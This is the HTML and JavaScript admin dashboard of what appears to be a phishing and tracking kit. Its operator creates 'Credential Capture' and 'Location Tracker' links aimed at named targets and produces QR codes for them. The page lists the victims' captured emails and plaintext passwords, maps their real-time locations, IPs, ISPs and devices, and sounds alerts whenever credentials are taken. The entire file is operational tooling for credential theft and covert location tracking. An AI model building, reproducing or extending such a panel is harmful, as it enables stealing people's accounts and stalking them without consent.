<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>:: HACKER-UI DASHBOARD v6.8 (Final) ::</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    <style>
        #map { height: 450px; width: 100%; }
        .leaflet-control-layers { background: rgba(0,0,0,0.8); border: 1px solid #00ff41; }
        .leaflet-control-layers-base label { color: #fff; font-family: 'VT323', monospace; font-size: 16px; }
        #log-section { background: black; border: 1px solid #00ff41; padding: 10px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 14px; margin-top: 20px; }
        #log-section p { margin: 2px 0; }
        .header-actions { display: flex; justify-content: space-between; align-items: center; }
        #advanced-options { display: none; border-left: 2px solid #00ffff; padding-left: 15px; margin-top: 10px;}
        #qr-code-modal .modal-content { max-width: 350px; text-align: center; }
        #qr-code-container { padding: 20px; background: white; margin-bottom: 20px; }
        #qr-code-container img { width: 100% !important; height: auto !important; }
        .feature-panel { border: 1px solid #00ffff; padding: 20px; margin-top: 20px; background-color: rgba(0, 255, 255, 0.05); box-shadow: 0 0 10px #00ffff inset; }
        .feature-panel h2 { text-align: center; color: #00ffff; text-shadow: 0 0 8px #00ffff; border-bottom: 1px solid #00ffff; padding-bottom: 10px; margin-top: 0; }
    </style>
</head>
<body>
    <script>
        const token = localStorage.getItem('authToken');
        if (!token) {
            window.location.href = '/login.html';
        }
    </script>
    <audio id="notification-sound" src="/sounds/notif.mp3" preload="auto"></audio>
    <div class="dashboard-container">
        <div class="dashboard-panel panel-left">
            <div class="header-actions">
                <h1 class="main-title" style="margin-bottom:0; border:none;">> ADMIN_DASHBOARD</h1>
                <button id="logout-btn" class="hacker-button small red">[ LOGOUT ]</button>
            </div>
            <hr style="border-color: #00ffff; margin-top: 10px;">
            
            <div class="feature-panel">
                <h2>> LINK_CREATION.GEN</h2>
                <form id="link-form" class="form-container active">
                    <div class="input-group"><label for="link-type">> Choose Link Type:</label>
                        <select id="link-type" class="hacker-input">
                            <option value="direct">Location Tracker Link</option>
                            <option value="intermediate">Credential Capture Link</option>
                        </select>
                    </div>
                    <div class="input-group"><label for="original-url">> Enter Destination URL:</label><input type="url" id="original-url" class="hacker-input" placeholder="https://google.com" required></div>
                    <div class="input-group"><label for="username">> Enter Target ID:</label><input type="text" id="username" class="hacker-input" required></div>
                    <a href="#" id="advanced-toggle" style="color: #00ffff; text-decoration: none;">[ + Advanced Options ]</a>
                    <div id="advanced-options">
                        <p style="color:#00ffff; margin-top: 10px;">> Device-Specific Redirects (Optional)</p>
                        <div class="input-group"><label for="url-android">> Android URL:</label><input type="url" id="url-android" class="hacker-input" placeholder="https://play.google.com/store/apps/details?id=..."></div>
                        <div class="input-group"><label for="url-ios">> iOS URL:</label><input type="url" id="url-ios" class="hacker-input" placeholder="https://apps.apple.com/app/..."></div>
                    </div>
                    <div class="input-group" style="margin-top: 15px;"><label for="expires-in">> Set Expiration:</label><select id="expires-in" class="hacker-input"><option value="">Never</option><option value="1">1 Hour</option><option value="24">24 Hours</option><option value="168">7 Days</option></select></div>
                    <button type="submit" id="submit-btn" class="hacker-button">[ GENERATE ]</button>
                </form>
            </div>

            <div id="result-box" class="result-box" style="display:none;"></div>
            <h1 class="main-title" style="margin-top: 30px;">> SYSTEM_STATS.LOG</h1>
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value" id="total-links">0</div><div class="stat-label">Total Links</div></div>
                <div class="stat-card"><div class="stat-value" id="total-clicks">0</div><div class="stat-label">Total Clicks</div></div>
                <div class="stat-card"><div class="stat-value" id="total-locations">0</div><div class="stat-label">Locations Logged</div></div>
            </div>
            <h1 class="main-title" style="margin-top: 30px;">> TOP_5_LINKS.CHART</h1>
            <canvas id="topLinksChart"></canvas>
            <h1 class="main-title" style="margin-top: 30px;">> BROWSER_STATS.CHART</h1>
            <canvas id="browserChart"></canvas>
            <h1 class="main-title" style="margin-top: 30px;">> LIVE_LOGS.TXT</h1>
            <div id="log-section"></div>
        </div>
        
        <div class="dashboard-panel panel-right">
            <h1 class="main-title" style="margin-bottom:0; border:none;">> LOCATION_TRACKER_LINKS.DAT</h1>
            <hr style="border-color: #00ffff; margin-top: 10px;">
            <div id="location-links-section"><p class="highlight">> Awaiting data...</p></div>

            <h1 class="main-title" style="margin-top: 30px;">> CREDENTIALS_LINKS_AND_LOGS.DAT</h1>
            <hr style="border-color: #ff4141; margin-top: 10px;">
            <div id="merged-credentials-section"><p class="highlight">> Awaiting data...</p></div>
            
            <div id="map-modal" class="modal">
                <div class="modal-content">
                    <span class="close-btn">×</span>
                    <h2 id="modal-title" class="main-title" style="font-size: 24px;">Location History</h2>
                    <div id="map"></div>
                    <div id="map-actions" style="text-align: center; margin-top: 15px;"></div>
                </div>
            </div>

            <h1 class="main-title" style="margin-top: 30px;">> REALTIME_LOCATION_MAP</h1>
            <div class="map-container feature-panel">
                <div id="realtime-map" style="height: 450px;"></div>
            </div>
        </div>
    </div>
    
    <div id="qr-code-modal" class="modal">
        <div class="modal-content">
            <span class="close-btn" id="qr-close-btn">×</span>
            <h2 class="main-title" style="font-size: 24px;">QR Code</h2>
            <div id="qr-code-container"></div>
            <a id="qr-download-link" href="#" download="qrcode.png" class="hacker-button">[ DOWNLOAD QR CODE ]</a>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const authToken = localStorage.getItem('authToken');
        const authHeaders = { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` };

        async function fetchProtected(url, options = {}) {
            const response = await fetch(url, { ...options, headers: { ...options.headers, ...authHeaders } });
            if (response.status === 401) { localStorage.removeItem('authToken'); window.location.href = '/login.html'; }
            return response;
        }

        const locationLinksSection = document.getElementById('location-links-section');
        const mergedCredentialsSection = document.getElementById('merged-credentials-section');
        const resultBox = document.getElementById('result-box');
        const totalLinksEl = document.getElementById('total-links'), totalClicksEl = document.getElementById('total-clicks'), totalLocationsEl = document.getElementById('total-locations');
        const logSection = document.getElementById('log-section'), logoutBtn = document.getElementById('logout-btn'), linkForm = document.getElementById('link-form');
        const advancedToggle = document.getElementById('advanced-toggle'), advancedOptions = document.getElementById('advanced-options');
        const notificationSound = document.getElementById('notification-sound');
        const modal = document.getElementById('map-modal'), modalTitle = document.getElementById('modal-title'), closeBtn = document.querySelector('.close-btn'), mapActionsDiv = document.getElementById('map-actions');
        const qrModal = document.getElementById('qr-code-modal'), qrCloseBtn = document.getElementById('qr-close-btn'), qrContainer = document.getElementById('qr-code-container'), qrDownloadLink = document.getElementById('qr-download-link');
        let topLinksChart, browserChart, map, markersLayer, realtimeMap, realtimeMarkersLayer, isAudioEnabled = false, qrcode = null;
        
        let currentCredentialCount = 0;
        let isInitialLoad = true;
        
        function showNotification(message, icon = '💀') {
            if (notificationSound.dataset.enabled === "true") {
                notificationSound.currentTime = 0;
                notificationSound.play().catch(e => console.error("Error playing sound:", e));
            } else {
                console.warn("Audio not enabled by user yet. Click anywhere to enable.");
            }
            const notificationElement = document.createElement("div");
            notificationElement.className = "click-notification";
            notificationElement.innerHTML = `<span>${icon}</span> ${message}`; 
            document.body.appendChild(notificationElement);
            setTimeout(() => {
                notificationElement.style.opacity = "0";
                setTimeout(() => notificationElement.remove(), 500);
            }, 5000);
        }
        
        function enableAudio() {
            if (notificationSound.dataset.enabled === "true") return;
            notificationSound.play().then(() => {
                notificationSound.pause();
                notificationSound.currentTime = 0;
                notificationSound.dataset.enabled = "true";
                console.log("✅ Audio unlocked successfully.");
                document.body.removeEventListener("click", enableAudio);
                document.body.removeEventListener("keydown", enableAudio);
            }).catch(e => {
                console.error("❌ Audio unlock failed. Requires user interaction.", e);
            });
        }
        document.body.addEventListener('click', enableAudio, { once: true });
        document.body.addEventListener('keydown', enableAudio, { once: true });

        function initModalMap() { if (!map) { const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' }); const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '© Esri' }); map = L.map('map', { center: [0, 0], zoom: 2, layers: [street] }); L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(map); markersLayer = L.featureGroup().addTo(map); } }
        function initRealtimeMap() { if (!realtimeMap) { const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' }); const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '© Esri' }); realtimeMap = L.map('realtime-map', { center: [0, 0], zoom: 2, layers: [street] }); L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(realtimeMap); realtimeMarkersLayer = L.featureGroup().addTo(realtimeMap); } }
        initRealtimeMap();

        function showQrModal(url) { qrContainer.innerHTML = ''; qrModal.style.display = 'block'; qrcode = new QRCode(qrContainer, { text: url, width: 256, height: 256, colorDark : "#000000", colorLight : "#ffffff", correctLevel : QRCode.CorrectLevel.H }); setTimeout(() => { const canvas = qrContainer.querySelector('canvas'); if (canvas) { qrDownloadLink.href = canvas.toDataURL("image/png"); } }, 50); }
        qrCloseBtn.onclick = () => { qrModal.style.display = "none"; };
        closeBtn.onclick = () => { modal.style.display = "none" };
        window.addEventListener('click', (event) => { if (event.target == qrModal) { qrModal.style.display = "none"; } if (event.target == modal) { modal.style.display = "none"; } });
        advancedToggle.addEventListener('click', (e) => { e.preventDefault(); const isHidden = advancedOptions.style.display === 'none'; advancedOptions.style.display = isHidden ? 'block' : 'none'; e.target.textContent = isHidden ? '[ - Advanced Options ]' : '[ + Advanced Options ]'; });

        function renderLocationLinksTable(links = []) {
            const locationLinks = links.filter(link => link.link_type === 'direct');
            if (locationLinks.length === 0) {
                locationLinksSection.innerHTML = "<p class='error'>> NO LOCATION TRACKER LINKS FOUND.</p>";
            } else {
                let html = `<table class="hacker-table"><thead><tr><th>Created At</th><th>Link ID</th><th>Target ID</th><th>Clicks</th><th>Last Location</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
                locationLinks.forEach(r => {
                    const linkUrl = `${window.location.protocol}//${window.location.host}/${r.id}`;
                    const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
                    const statusClass = isExpired ? 'error' : 'highlight';
                    const statusText = isExpired ? 'EXPIRED' : 'ACTIVE';
                    let mapButton = `<button class="hacker-button small" disabled>[ MAP ]</button>`;
                    if (r.click_count > 0 && r.city) { 
                        mapButton = `<button class="hacker-button small" onclick="showMapModal('${r.id}', '${r.username}')">[ MAP ]</button>`; 
                    }
                    const qrButton = `<button class="hacker-button small" onclick="showQrModal('${linkUrl}')">[ QR ]</button>`;
                    const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')">[ DELETE ]</button>`;
                    const locationText = r.city && r.country ? `${r.city}, ${r.country}` : 'N/A';
                    html += `<tr><td>${new Date(r.created_at).toLocaleString('id-ID')}</td><td><a href="${linkUrl}" target="_blank">${r.id}</a></td><td class="highlight">${r.username}</td><td class="highlight">${r.click_count}</td><td class="highlight">${locationText}</td><td class="${statusClass}">${statusText}</td><td class="action-buttons">${mapButton} ${qrButton} ${deleteButton}</td></tr>`;
                });
                html += "</tbody></table>";
                locationLinksSection.innerHTML = html;
            }
        }
        
        function renderMergedCredentialsTable(links = [], credentials = []) {
            const credentialLinks = links.filter(link => link.link_type === 'intermediate');

            if (credentialLinks.length === 0) {
                mergedCredentialsSection.innerHTML = "<p class='error'>> NO CREDENTIAL CAPTURE LINKS CREATED.</p>";
                return;
            }

            let mergedData = [];
            const credentialsMap = new Map();
            for (const cred of credentials) {
                if (!credentialsMap.has(cred.tracker_id)) {
                    credentialsMap.set(cred.tracker_id, []);
                }
                credentialsMap.get(cred.tracker_id).push(cred);
            }

            for (const link of credentialLinks) {
                const capturedCreds = credentialsMap.get(link.id);
                if (capturedCreds && capturedCreds.length > 0) {
                    for (const cred of capturedCreds) {
                        mergedData.push({ ...link, email: cred.email, password: cred.password, ip_address: cred.ip_address, event_time: cred.created_at });
                    }
                } else {
                    mergedData.push({ ...link, email: 'N/A', password: 'N/A', ip_address: 'N/A', event_time: link.created_at });
                }
            }

            mergedData.sort((a, b) => new Date(b.event_time) - new Date(a.event_time));

            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Link ID</th><th>Target ID</th><th>Clicks</th><th>Email</th><th>Password</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
            mergedData.forEach(r => {
                const linkUrl = `${window.location.protocol}//${window.location.host}/${r.id}`;
                const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
                const statusClass = isExpired ? 'error' : 'highlight';
                const statusText = isExpired ? 'EXPIRED' : 'ACTIVE';
                const qrButton = `<button class="hacker-button small" onclick="showQrModal('${linkUrl}')">[ QR ]</button>`;
                const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')">[ DELETE ]</button>`;
                
                html += `<tr>
                    <td>${new Date(r.event_time).toLocaleString('id-ID')}</td>
                    <td><a href="${linkUrl}" target="_blank">${r.id}</a></td>
                    <td class="highlight">${r.username}</td>
                    <td class="highlight">${r.click_count}</td>
                    <td class="highlight">${r.email}</td>
                    <td class="highlight">${r.password}</td>
                    <td class="${statusClass}">${statusText}</td>
                    <td class="action-buttons">${qrButton} ${deleteButton}</td>
                </tr>`;
            });
            html += "</tbody></table>";
            mergedCredentialsSection.innerHTML = html;
        }
        
        function updateStats(e) { totalLinksEl.textContent = e.total_links || 0, totalClicksEl.textContent = e.total_clicks || 0, totalLocationsEl.textContent = e.total_locations || 0 }
        function updateTopLinksChart(e = []) { const o = document.getElementById('topLinksChart').getContext('2d'), t = [...e].sort((e, o) => o.click_count - e.click_count).slice(0, 5), a = t.map(e => e.id), n = t.map(e => e.click_count); topLinksChart ? (topLinksChart.data.labels = a, topLinksChart.data.datasets[0].data = n, topLinksChart.update()) : topLinksChart = new Chart(o, { type: 'bar', data: { labels: a, datasets: [{ label: 'Total Clicks', data: n, backgroundColor: 'rgba(0,255,65,0.5)', borderColor: '#00ff41', borderWidth: 1 }] }, options: { indexAxis: 'y', scales: { x: { ticks: { color: '#00ff41' } } }, plugins: { legend: { display: !1 } } } }) }
        function updateBrowserChart(e = {}) { const o = document.getElementById('browserChart').getContext('2d'), t = Object.keys(e), a = Object.values(e); browserChart ? (browserChart.data.labels = t, browserChart.data.datasets[0].data = a, browserChart.update()) : browserChart = new Chart(o, { type: 'pie', data: { labels: t, datasets: [{ data: a, backgroundColor: ['#00ff41', '#ff0041', '#41aaff', '#ffaa00', '#888888'] }] }, options: { plugins: { legend: { labels: { color: '#00ff41' } } } } }) }
        
        async function deleteLink(e, o) { if (confirm(`Are you sure you want to delete the link for target '${o}' (${e})?\n\nAll associated location and credential data will also be permanently deleted!`)) try { const response = await fetchProtected(`/api/links/${e}`, { method: 'DELETE' }); if (!response.ok) throw new Error('Failed to delete link.') } catch (e) { alert(`Error: ${e.message}`) } }
        async function showMapModal(id, name) {
            initModalMap();
            modal.style.display = "block";
            modalTitle.textContent = `> Location History for: ${name}`;
            setTimeout(() => map.invalidateSize(), 1);
            markersLayer.clearLayers();
            mapActionsDiv.innerHTML = `<p class="highlight">Loading data...</p>`;
            try {
                const response = await fetchProtected(`/api/locations/${id}`);
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                const locations = await response.json();
                if (locations && locations.length > 0) {
                    const validLocations = locations.filter(loc => loc.latitude != null && loc.longitude != null);
                    if (validLocations.length > 0) {
                        validLocations.forEach(loc => {
                            const marker = L.marker([loc.latitude, loc.longitude]);
                            const locationString = (loc.city && loc.country) ? `${loc.city}, ${loc.country}` : 'Location unknown';
                            marker.bindPopup(`<b>${new Date(loc.created_at).toLocaleString('id-ID')}</b><br><strong>${locationString}</strong><br><br><strong>IP:</strong> ${loc.ip_address}<br><strong>ISP:</strong> ${loc.isp || 'N/A'}<br><strong>Organization:</strong> ${loc.org || 'N/A'}<br><strong>Proxy/VPN:</strong> ${loc.proxy ? '<span class="error">Yes</span>' : 'No'}<br><br><strong>Device:</strong> ${loc.browser} on ${loc.os}<br>(${loc.device.type} - ${loc.device.vendor} ${loc.device.model})`);
                            markersLayer.addLayer(marker);
                        });
                        const latestLocation = validLocations[0];
                        const googleMapsUrl = `http://googleusercontent.com/maps.google.com/9{latestLocation.latitude},${latestLocation.longitude}`;
                        mapActionsDiv.innerHTML = `<a href="${googleMapsUrl}" target="_blank" class="hacker-button">[ VIEW MORE DETAILS ON GOOGLE MAPS ]</a>`;
                        map.fitBounds(markersLayer.getBounds());
                    } else {
                        mapActionsDiv.innerHTML = `<p class="error">No valid location data found for this link.</p>`;
                        map.setView([0, 0], 2);
                    }
                } else {
                    mapActionsDiv.innerHTML = `<p class="error">No location data found for this link.</p>`;
                    map.setView([0, 0], 2);
                }
            } catch (err) {
                mapActionsDiv.innerHTML = `<p class="error">Failed to load location data. Error: ${err.message}</p>`;
                map.setView([0, 0], 2);
            }
        }

        const socket = io();
        socket.on('connect', () => {
            console.log('✅ Connected to server via WebSocket!');
            socket.emit('request_initial_data', { token: authToken });
        });

        socket.on('dashboard_update', e => {
            if (!isInitialLoad && e.credentials.length > currentCredentialCount) {
                const newCredential = e.credentials[0];
                showNotification(`🔒 Credentials captured from [<strong>${newCredential.username}</strong>]!`, '🔒');
            }
            currentCredentialCount = e.credentials.length;
            isInitialLoad = false;

            renderLocationLinksTable(e.links);
            renderMergedCredentialsTable(e.links, e.credentials);
            updateStats(e.stats);
            updateTopLinksChart(e.links);
            updateBrowserChart(e.browserStats);
        });

        socket.on('new_log_message', e => { const o = document.createElement('p'); o.textContent = e; logSection.appendChild(o); logSection.scrollTop = logSection.scrollHeight });
        socket.on('link_clicked', e => { showNotification(`Link accessed by [<strong>${e.username}</strong>]!`); });
        
        socket.on('new_location_logged', (newLocation) => {
            showNotification(`📍 Location captured from [<strong>${newLocation.username}</strong>]!`, '📍');
            console.log('📍 New location received in real-time:', newLocation);
            const marker = L.marker([newLocation.latitude, newLocation.longitude]);
            const locationString = (newLocation.city && newLocation.country) ? `${newLocation.city}, ${newLocation.country}` : 'Location unknown';
            marker.bindPopup(`<b>${newLocation.username}</b><br>${new Date(newLocation.created_at).toLocaleString('id-ID')}<br><strong>${locationString}</strong>`);
            if(realtimeMarkersLayer) {
                realtimeMarkersLayer.addLayer(marker);
                realtimeMap.panTo([newLocation.latitude, newLocation.longitude]);
            }
        });
        
        linkForm.addEventListener('submit', async e => {
            e.preventDefault();
            const submitBtn = document.getElementById('submit-btn');
            submitBtn.textContent = "[ ...PROCESSING... ]"; submitBtn.disabled = true;
            try {
                const body = {
                    username: document.getElementById('username').value,
                    originalUrl: document.getElementById('original-url').value,
                    url_android: document.getElementById('url-android').value,
                    url_ios: document.getElementById('url-ios').value,
                    expiresIn: document.getElementById('expires-in').value,
                    linkType: document.getElementById('link-type').value
                };
                const response = await fetchProtected('/create', { method: 'POST', body: JSON.stringify(body) });
                const o = await response.json();
                if (o.newLink) {
                    resultBox.style.display = 'block'; resultBox.innerHTML = `<p>> LINK GENERATED FOR <span class="highlight">${o.username}</span>: <a href="${o.newLink}" target="_blank">${o.newLink}</a></p>`;
                    linkForm.reset(); advancedOptions.style.display = 'none'; advancedToggle.textContent = '[ + Advanced Options ]';
                } else { throw new Error(o.error || o.message); }
            } catch (e) {
                resultBox.style.display = 'block'; resultBox.innerHTML = `<p class="error">> ERROR: ${e.message}</p>`;
            } finally {
                submitBtn.textContent = "[ GENERATE ]"; submitBtn.disabled = false;
            }
        });

        logoutBtn.addEventListener('click', () => {
            localStorage.removeItem('authToken');
            window.location.href = '/login.html';
        });
    </script>
</body>
</html>